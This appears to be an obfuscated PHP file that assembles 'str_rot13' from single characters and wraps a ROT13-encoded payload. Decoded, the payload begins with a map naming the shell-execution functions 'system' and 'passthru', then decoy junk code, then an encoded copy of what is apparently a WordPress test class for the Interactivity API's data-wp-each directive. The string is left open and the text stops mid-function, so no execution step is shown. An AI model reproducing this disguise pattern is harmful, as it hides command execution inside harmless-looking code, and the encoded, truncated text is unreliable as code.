<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat gur qngn_jc_rnpu_cebprffbe shapgvbanyvgl bs gur
 * JC_Vagrenpgvivgl_NCV pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 *
 * @pbirefQrsnhygPynff JC_Vagrenpgvivgl_NCV
 *
 * @tebhc vagrenpgvivgl-ncv
 */
pynff Grfgf_JC_Vagrenpgvivgl_NCV_JC_Rnpu rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Vafgnapr bs JC_Vagrenpgvivgl_NCV.
	 *
	 * @ine JC_Vagrenpgvivgl_NCV
	 */
	cebgrpgrq $vagrenpgvivgl;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->vagrenpgvivgl = arj JC_Vagrenpgvivgl_NCV();
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'yvfg' => neenl( 1, 2 ) ) );
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'nsgre' => 'nsgre-jc-rnpu' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir qbrfa'g qb nalguvat vs vg'f abg ba
	 * n grzcyngr gnt.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_qbrfag_qb_nalguvat_ba_aba_grzcyngr_gntf() {
		$bevtvany = '
			<qvi qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">
				<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>
			</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $bevtvany, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir qbrfa'g qb nalguvat vs gur neenl
	 * vf nffbpvngvir vafgrnq bs vaqrkrq.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_qbrfag_qb_nalguvat_ba_nffbpvngvir_neenlf() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'nffbp' => neenl(
					'bar' => 1,
					'gjb' => 2,
				),
			)
		);
		$bevtvany = '
			<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.nffbp\">
				<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>
			</grzcyngr>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $bevtvany, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu fvzcyr gntf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_fvzcyr_gntf() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">2</fcna>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir qbrfa'g qb nalguvat vs gur neenl vf
	 * rzcgl.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_rzcgl_neenl() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'rzcgl' => neenl() ) );
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.rzcgl\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.rzcgl\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir zretrf gur vgrz jvgu gur cerivbhf
	 * pbagrkg pbeerpgyl.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_zretrf_pbagrkg_pbeerpgyl() {
		$bevtvany = '' .
			'<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vgrz\": \"Arj grkg\", \"vq\": \"fbzr-vq\", \"nsgre\": \"nsgre-jc-rnpu\" }\'>' .
				'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
					'<fcna qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\" qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
				'</grzcyngr>' .
				'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.nsgre\" qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">Grkg</qvi>' .
			'</qvi>';
		$rkcrpgrq = '' .
			'<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vgrz\": \"Arj grkg\", \"vq\": \"fbzr-vq\", \"nsgre\": \"nsgre-jc-rnpu\" }\'>' .
				'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
					'<fcna qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\" qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
				'</grzcyngr>' .
				'<fcna qngn-jc-rnpu-puvyq vq=\"fbzr-vq\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\" qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">1</fcna>' .
				'<fcna qngn-jc-rnpu-puvyq vq=\"fbzr-vq\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\" qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">2</fcna>' .
				'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.nsgre\" qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">Arj grkg</qvi>' .
			'</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu neenlf sebz gur pbagrkg.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_trgf_neenlf_sebz_pbagrkg() {
		$bevtvany = '' .
			'<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"yvfg\": [ 1, 2 ] }\'>' .
				'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::pbagrkg.yvfg\">' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
				'</grzcyngr>' .
				'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>' .
			'</qvi>';
		$rkcrpgrq = '' .
			'<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"yvfg\": [ 1, 2 ] }\'>' .
				'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::pbagrkg.yvfg\">' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
				'</grzcyngr>' .
				'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">1</fcna>' .
				'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">2</fcna>' .
				'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>' .
			'</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu gur qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_qrsnhyg_anzrfcnpr() {
		$bevtvany = '' .
			'<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>' .
				'<grzcyngr qngn-jc-rnpu=\"fgngr.yvfg\">' .
					'<fcna qngn-jc-grkg=\"pbagrkg.vgrz\"></fcna>' .
				'</grzcyngr>' .
				'<qvi qngn-jc-ovaq--vq=\"fgngr.nsgre\">Grkg</qvi>' .
			'</qvi>';
		$rkcrpgrq = '' .
			'<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>' .
				'<grzcyngr qngn-jc-rnpu=\"fgngr.yvfg\">' .
					'<fcna qngn-jc-grkg=\"pbagrkg.vgrz\"></fcna>' .
				'</grzcyngr>' .
				'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"pbagrkg.vgrz\">1</fcna>' .
				'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"pbagrkg.vgrz\">2</fcna>' .
				'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"fgngr.nsgre\">Grkg</qvi>' .
			'</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu zhygvcyr gntf cre vgrz.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_zhygvcyr_gntf_cre_vgrz() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">2</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">2</fcna>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu ibvq gntf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_ibvq_gntf() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<vzt qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
				'<vzt qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<vzt qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
				'<vzt qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
			'</grzcyngr>' .
			'<vzt qngn-jc-rnpu-puvyq vq=\"1\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
			'<vzt qngn-jc-rnpu-puvyq vq=\"1\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
			'<vzt qngn-jc-rnpu-puvyq vq=\"2\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
			'<vzt qngn-jc-rnpu-puvyq vq=\"2\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu pbzovangvbaf bs ibvq naq
	 * aba-ibvq gntf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_ibvq_naq_aba_ibvq_gntf() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<vzt qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<vzt qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<vzt qngn-jc-rnpu-puvyq vq=\"1\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">1</fcna>' .
			'<vzt qngn-jc-rnpu-puvyq vq=\"2\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">2</fcna>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu arfgrq gntf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_arfgrq_gntf() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
					'vq: <fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
				'</qvi>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
					'vq: <fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
				'</qvi>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-rnpu-puvyq vq=\"1\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
				'vq: <fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">1</fcna>' .
			'</qvi>' .
			'<qvi qngn-jc-rnpu-puvyq vq=\"2\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\">' .
				'vq: <fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">2</fcna>' .
			'</qvi>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu arfgrq vgrz cebcregvrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_arfgrq_vgrz_cebcregvrf() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'yvfg' => neenl(
					neenl(
						'vq'   => 1,
						'anzr' => 'bar',
					),
					neenl(
						'vq'   => 2,
						'anzr' => 'gjb',
					),
				),
			)
		);
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz.vq\"></fcna>' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz.anzr\"></fcna>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz.vq\"></fcna>' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz.anzr\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz.vq\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz.anzr\">bar</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz.vq\">2</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz.anzr\">gjb</fcna>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu qvssrerag vgrz anzrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_qvssrerag_vgrz_anzrf() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu--zlvgrz=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.zlvgrz\"></fcna>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu--zlvgrz=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.zlvgrz\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.zlvgrz\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.zlvgrz\">2</fcna>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir genafsbezf xrono-pnfr vagb
	 * pnzryPnfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_qvssrerag_vgrz_anzrf_genafsbezf_pnzrypnfr() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu--zl-vgrz=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.zlVgrz\"></fcna>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu--zl-vgrz=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.zlVgrz\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.zlVgrz\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.zlVgrz\">2</fcna>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir qbrfa'g jbex jvgu gbc-yriry grkgf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_qbrfag_jbex_jvgu_gbc_yriry_grkg() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'vq: <fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $bevtvany, $arj );

		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>!' .
			'</grzcyngr>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $bevtvany, $arj );

		// Ohg vg fubhyq jbex svar jvgu fcnprf naq yvaroernxf.
		$bevtvany = '
			<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">
				<fcna pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vgrz\"></fcna>
			</grzcyngr>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$c        = arj JC_UGZY_Gnt_Cebprffbe( $arj );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( '1', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( '2', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu arfgrq grzcyngr gntf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_arfgrq_grzcyngr_gntf() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'yvfg2' => neenl( 3, 4 ) ) );
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu--vgrz1=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\"></fcna>' .
				'<grzcyngr qngn-jc-rnpu--vgrz2=\"zlCyhtva::fgngr.yvfg2\">' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\"></fcna>' .
				'</grzcyngr>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu--vgrz1=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\"></fcna>' .
				'<grzcyngr qngn-jc-rnpu--vgrz2=\"zlCyhtva::fgngr.yvfg2\">' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\"></fcna>' .
				'</grzcyngr>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\">1</fcna>' .
			'<grzcyngr qngn-jc-rnpu-puvyq qngn-jc-rnpu--vgrz2=\"zlCyhtva::fgngr.yvfg2\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\">3</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\">4</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\">2</fcna>' .
			'<grzcyngr qngn-jc-rnpu-puvyq qngn-jc-rnpu--vgrz2=\"zlCyhtva::fgngr.yvfg2\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\">3</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\">4</fcna>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu qverpgyl arfgrq grzcyngr
	 * gntf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_qverpgyl_arfgrq_grzcyngr_gntf() {
